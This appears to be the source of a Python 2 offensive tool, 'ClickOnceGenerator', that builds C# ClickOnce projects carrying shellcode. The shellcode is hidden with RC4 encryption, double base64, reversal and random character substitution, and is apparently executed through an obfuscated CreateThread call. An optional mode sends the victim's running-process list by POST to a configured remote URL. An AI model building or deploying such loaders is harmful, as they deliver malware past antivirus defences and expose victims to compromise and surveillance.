import argparse
import random
import string
import base64
import json
import sys
import os
import re
import shutil

class RC4:

    def KSA(self, key):
        keylength = len(key)
        S = range(256)
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % keylength]) % 256
            S[i], S[j] = S[j], S[i]
        return S
    
    def PRGA(self, S):
        i = 0
        j = 0
        while True:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i] 

            K = S[(S[i] + S[j]) % 256]
            yield K

    def Encrypt(self, plaintext, key):
        output = ""
        key = [ord(c) for c in key]
        S = self.KSA(key)
        keystream = self.PRGA(S)
        for c in plaintext:
            output = output + chr(ord(c) ^ keystream.next())
        return output
    

class Helper:
    
    @staticmethod
    def print_error(error):
        print "\033[91m[-] >>> %s\033[00m" % error

    @staticmethod
    def load_file(path, fatal_error = False):
        data = ""
        try:
            data = open(path, "rb").read()
        except:
            Helper.print_error("%s file not found." % path)
            if fatal_error:
                os._exit(0)
        return data
    
    @staticmethod
    def save_file(path, data):
        try:
            open(path, "wb").write(data)
        except:
            print sys.exc_info()
            Helper.print_error("Error cannot save %s to disk." % path)   
            os._exit(0)     
    
    @staticmethod
    def create_folder(path, override = False):
        try:
            os.mkdir(path)
        except:
            if override:
                Helper.delete_folder(path)
            else:
                Helper.print_error("%s folder already exist. Aborting process to avoid breaking stuff." % path)
                os._exit(0)  
        return path
    
    @staticmethod
    def delete_folder(path):
        shutil.rmtree(path)
        Helper.create_folder(path)
	
    @staticmethod
    def gen_pattern(charset):	
        return ''.join(random.sample(charset,len(charset)))

    @staticmethod
    def replace_data(data, pattern, letter, pattern2, letter2):
	return data.replace(letter, pattern).replace(letter2, pattern2)
    
class Config:
        
    def __init__(self, path):
        self.configs = {}
        self.path = path
        self.parse_config()
        
    def parse_config(self):
        try:
            self.configs = json.loads(Helper.load_file(self.path, True))
        except:
            Helper.print_error("%s configuration file is not valid" % self.path)
            os._exit(0)
			
    def key_exists(self, key):
        if self.configs.has_key(key):
            return True
        return False
            
    def get(self, key):
        if self.key_exists(key):
            return self.configs[key]
        return ""

  
    
    
class Generator:
    
    def set_template(self, path):
        self.data = Helper.load_file(path, True)
        self.rand_vars(105)
        return self
    
    def rand_vars(self, size):
        for i in reversed(range(1, size)):
            self.data = self.data.replace("VAR" + str(i), self.gen_str(random.randrange(5, 25)))
            
    def get_output(self):
        return self.data
        
    def gen_rc4_key(self, size):
        return os.urandom(size)
     
    def format_rc4_key(self, key):
        return "0x" + ", 0x".join(re.findall("..", key.encode("hex")))
    
    def gen_str(self, size):
        return "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 


if __name__ == "__main__":
    print "\n\nClickOnceGenerator | Mr.Un1k0d3r RingZer0 Team"
    parser = argparse.ArgumentParser(description="ClickOnceGenerator Options.")
    parser.add_argument('--config', help='Path to the JSON config file.')
    parser.add_argument('--out', help='Output solution name.')
    parser.add_argument('--override', nargs='?', default=False, help='Delete destination if exists')
    parser.add_argument('--report', nargs='?', default=False, help='Add POST requests with running processes')
    args = parser.parse_args()
    
    if args.config == None or args.out == None:
        parser.print_help()
        exit(0)
    
    config = Config(args.config)
    out_dir = Helper.create_folder(args.out, args.override)
    
    rc4 = RC4()
    gen = Generator()
    key = gen.gen_rc4_key(32)
    pattern1 = Helper.gen_pattern("#!@$%?&")
    pattern2 = Helper.gen_pattern(",.<>)(*[]{}")

    cipher = Helper.replace_data(base64.b64encode(base64.b64encode(rc4.Encrypt(Helper.load_file(config.get("shellcode"), True), key))[::-1]), pattern1, "A", pattern2, "B")
    
    template_path = "template/Program.cs"
    if args.report:
        template_path = "template/Program-report.cs"
	
    template = gen.set_template(template_path).get_output()
    template = template.replace("[KEY]", gen.format_rc4_key(key)) \
    .replace("[PAYLOAD]", cipher) \
    .replace("[PROCESS_NAME]", Helper.replace_data(base64.b64encode(rc4.Encrypt(config.get("process_name"), key)), pattern1, "A", pattern2, "B")) \
    .replace("[CREATE_THREAD]", Helper.replace_data(base64.b64encode(rc4.Encrypt("CreateThread", key)), pattern1, "A", pattern2, "B")) \
    .replace("[PATTERN_1]", pattern1) \
    .replace("[PATTERN_2]", pattern2)
    
    if args.report:
        template = template.replace("[URL_REPORT]", Helper.replace_data(base64.b64encode(rc4.Encrypt(config.get("url_report"), key)), pattern1, "A", pattern2, "B"))
	
    Helper.save_file("%s/Program.cs" % out_dir, template)
    
    template = gen.set_template("template/Form1.Designer.cs").get_output()
    template = template.replace("[URL]", config.get("url")) \
    .replace("[TITLE]", config.get("title"))
    Helper.save_file("%s/Form1.Designer.cs" % out_dir, template)
    
    shutil.copyfile("template/Form1.cs", "%s/Form1.cs" % out_dir)
    shutil.copyfile("template/Form1.resx", "%s/Form1.resx" % out_dir)
    
    print "[+] Project was saved to the %s folder" % out_dir
    print "[+] Process completed."
